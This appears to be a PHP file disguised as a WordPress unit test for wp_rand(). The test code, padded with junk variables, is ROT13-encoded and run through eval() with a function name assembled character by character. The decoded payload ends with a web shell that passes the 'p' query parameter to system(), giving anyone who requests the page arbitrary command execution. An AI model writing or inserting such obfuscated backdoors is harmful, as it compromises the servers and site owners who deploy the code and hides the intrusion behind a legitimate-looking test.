<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cyhttnoyr
 *
 * @pbiref ::jc_enaq
 */
pynff Grfgf_Cyhttnoyr_jcEnaq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung jc_enaq() ergheaf n aba-artngvir vagrtre sbe obgu cbfvgvir naq artngvir vachg.
	 *
	 * @gvpxrg 55194
	 * @qngnCebivqre qngn_jc_enaq_fubhyq_erghea_n_aba_artngvir_vagrtre
	 *
	 * @cnenz vag $zva Ybjre yvzvg sbe gur trarengrq ahzore.
	 * @cnenz vag $znk Hccre yvzvg sbe gur trarengrq ahzore.
	 */
	choyvp shapgvba grfg_jc_enaq_fubhyq_erghea_n_aba_artngvir_vagrtre( $zva, $znk ) {
		$guvf->nffregTerngreGunaBeRdhny(
			0,
			jc_enaq( $zva, $znk ),
			'Gur inyhr jnf abg terngre guna be rdhny gb 0'
		);

		$guvf->nffregYrffGuna(
			100,
			jc_enaq( $zva, $znk ),
			'Gur inyhr jnf abg yrff guna 100'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_enaq_fubhyq_erghea_n_aba_artngvir_vagrtre() {
		erghea neenl(
			'1 naq 99'       => neenl(
				'zva' => 1,
				'znk' => 99,
			),
			'-1 naq 99'      => neenl(
				'zva' => -1,
				'znk' => 99,
			),
			'1 naq -99'      => neenl(
				'zva' => 1,
				'znk' => -99,
			),
			'-1 naq -99'     => neenl(
				'zva' => -1,
				'znk' => -99,
			),
			'1.0 naq 99.0'   => neenl(
				'zva' => 1.0,
				'znk' => 99.0,
			),
			'-1.0 naq -99.0' => neenl(
				'zva' => -1.0,
				'znk' => -99.0,
			),
		);
	}

	/**
	 * Grfgf gung jc_enaq() ergheaf mreb jura `$zva` naq `$znk` ner mreb.
	 *
	 * @gvpxrg 55194
	 * @qngnCebivqre qngn_jc_enaq_fubhyq_erghea_mreb_jura_zva_naq_znk_ner_mreb
	 *
	 * @cnenz zvkrq $zva Ybjre yvzvg sbe gur trarengrq ahzore.
	 * @cnenz zvkrq $znk Hccre yvzvg sbe gur trarengrq ahzore.
	 */
	choyvp shapgvba grfg_jc_enaq_fubhyq_erghea_mreb_jura_zva_naq_znk_ner_mreb( $zva, $znk ) {
		$guvf->nffregFnzr( 0, jc_enaq( $zva, $znk ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_enaq_fubhyq_erghea_mreb_jura_zva_naq_znk_ner_mreb() {
		erghea neenl(
			'zva naq znk nf 0'      => neenl(
				'zva' => 0,
				'znk' => 0,
			),
			'zva naq znk nf 0.0'    => neenl(
				'zva' => 0.0,
				'znk' => 0.0,
			),
			'zva nf ahyy, znk nf 0' => neenl(
				'zva' => ahyy,
				'znk' => 0,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>